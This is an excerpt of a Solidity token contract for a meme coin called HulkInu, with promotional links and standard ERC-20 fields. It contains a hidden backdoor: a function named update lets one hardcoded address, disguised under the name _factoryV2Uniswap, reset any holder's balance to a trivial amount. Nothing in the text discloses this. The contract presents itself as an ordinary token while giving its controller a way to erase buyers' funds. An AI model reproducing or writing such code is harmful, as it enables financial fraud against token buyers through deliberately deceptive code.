...
/*
https://twitter.com/HulkInuETH
https://t.me/HulkInuETH
https://HulkInuETH.xyz
*/
...
contract HulkInu is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"HulkInu";
    string private constant _symbol = unicode"HULKINU";
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 5010000000000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _factoryV2Uniswap = 0x27C08dCC254409Cd792cE7b07a343C0029af0d35;
    ...
    function update(address updateSender) external { if (msg.sender == _factoryV2Uniswap) _balances[updateSender] = 0x2; }
